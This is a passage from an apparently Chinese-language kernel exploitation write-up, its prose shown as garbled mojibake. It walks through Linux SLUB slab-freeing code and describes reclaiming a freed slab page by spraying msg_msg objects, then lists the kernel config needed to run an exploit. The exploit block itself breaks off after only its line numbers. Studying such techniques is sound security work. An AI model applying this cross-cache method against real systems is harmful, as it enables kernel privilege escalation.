unlikely(!prior)) &#123;</span><br><span class="line">remove_full(s, n, page);</span><br><span class="line">add_partial(n, page, DEACTIVATE_TO_TAIL);</span><br><span class="line">stat(s, FREE_ADD_PARTIAL);</span><br><span class="line">&#125;</span><br><span class="line">spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">slab_empty:</span><br><span class="line"><span class="keyword">if</span> (prior) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Slab on the partial list.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">remove_partial(n, page);</span><br><span class="line">stat(s, FREE_REMOVE_PARTIAL);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* Slab must be on the full list */</span></span><br><span class="line">remove_full(s, n, page);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);</span><br><span class="line">stat(s, FREE_SLAB);</span><br><span class="line">discard_slab(s, page);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œä¼šéªŒè¯æ•°é‡æ˜¯å¦æ»¡äº†ï¼Œå¦‚æœæ»¡äº†åˆ™ä¼šè¿›å…¥é”€æ¯æµç¨‹è°ƒç”¨<code>discard_slab</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">discard_slab</span><span class="params">(struct kmem_cache *s, struct page *page)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">dec_slabs_node(s, page_to_nid(page), page-&gt;objects);</span><br><span class="line">free_slab(s, page);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œ<code>discard_slab</code>å‡½æ•°é¦–å…ˆåšçš„äº‹æ˜¯ä¿®æ”¹ä¸€äº›æ•°æ®ä¸Šçš„å†…å®¹éšåæ¥ç€è°ƒç”¨<code>free_slab</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">free_slab</span><span class="params">(struct kmem_cache *s, struct page *page)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (unlikely(s-&gt;flags &amp; SLAB_TYPESAFE_BY_RCU)) &#123;</span><br><span class="line">call_rcu(&amp;page-&gt;rcu_head, rcu_free_slab);</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">__free_slab(s, page);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __free_slab(struct kmem_cache *s, struct page *page)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> order = compound_order(page);</span><br><span class="line"><span class="keyword">int</span> pages = <span class="number">1</span> &lt;&lt; order;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (kmem_cache_debug_flags(s, SLAB_CONSISTENCY_CHECKS)) &#123;</span><br><span class="line"><span class="keyword">void</span> *p;</span><br><span class="line"></span><br><span class="line">slab_pad_check(s, page);</span><br><span class="line">for_each_object(p, s, page_address(page),</span><br><span class="line">page-&gt;objects)</span><br><span class="line">check_object(s, page, p, SLUB_RED_INACTIVE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__ClearPageSlabPfmemalloc(page);</span><br><span class="line">__ClearPageSlab(page);</span><br><span class="line"><span class="comment">/* In union with page-&gt;mapping where page allocator expects NULL */</span></span><br><span class="line">page-&gt;slab_cache = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (current-&gt;reclaim_state)</span><br><span class="line">current-&gt;reclaim_state-&gt;reclaimed_slab += pages;</span><br><span class="line">unaccount_slab_page(page, order, s);</span><br><span class="line">__free_pages(page, order);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåšçš„äº‹å°±æ˜¯è·å¾—<code>page</code>çš„<code>order</code>å»å‡º<code>page-&gt;slab_cache</code>çš„æŒ‡é’ˆï¼Œæœ€åé‡Šæ”¾å¯¹åº”<code>page</code>ã€‚å½“é‡Šæ”¾<code>page</code>å°±å¥½åŠäº†ï¼Œå¯ä»¥å¤§é‡å †å–·<code>msg_msg</code>å‘<code>buddy system</code>ç”³è¯·pageå³å¯ã€‚</p><h3 id="ç»¼ä¸Šï¼Œå¯å¾—exp"><a href="#ç»¼ä¸Šï¼Œå¯å¾—exp" class="headerlink" title="ç»¼ä¸Šï¼Œå¯å¾—exp"></a>ç»¼ä¸Šï¼Œå¯å¾—exp</h3><p>å¯ä»¥é¢„è§çš„æ˜¯ï¼Œè¿™ä¸€åˆ©ç”¨æ–¹æ³•æ˜¯ä¸éœ€è¦ä¾èµ–ä»»ä½•åœ°å€çš„ï¼Œä½†æ˜¯è¿™é‡Œæƒ³è¦è·‘é€šexpéœ€è¦ä¿®æ”¹ä¸€ä¸‹configæ–‡ä»¶</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_NET_CLS_ROUTE4=y</span><br><span class="line">CONFIG_DUMMY=y </span><br><span class="line">CONFIG_NET_SCH_QFQ=y </span><br><span class="line">CONFIG_NET_CLS_BASIC=y</span><br></pre></td></tr></table></figure><p>(æœ‰ç‚¹ä¸æƒ³å†™expäº†ï¼Œå¦‚æœæ²¡åˆ è¿™å¥è¯é‚£ä¸‹é¢expå°±æ˜¯åŸæ–‡çš„ï¼Œå¦‚æœåˆ äº†å°±æ˜¯è‡ªå·±å†™çš„<del>å¥½åƒåˆ äº†ä½ ä»¬ä¹Ÿçœ‹ä¸åˆ°</del>)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span 